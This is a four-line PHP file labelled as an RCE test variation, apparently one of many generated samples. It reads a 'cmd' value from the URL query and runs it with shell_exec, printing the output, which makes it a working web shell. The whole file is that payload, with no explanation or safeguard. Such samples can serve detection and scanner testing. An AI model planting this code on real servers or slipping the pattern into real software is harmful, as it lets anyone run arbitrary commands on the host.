<?php
// RCE test variation #1060
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>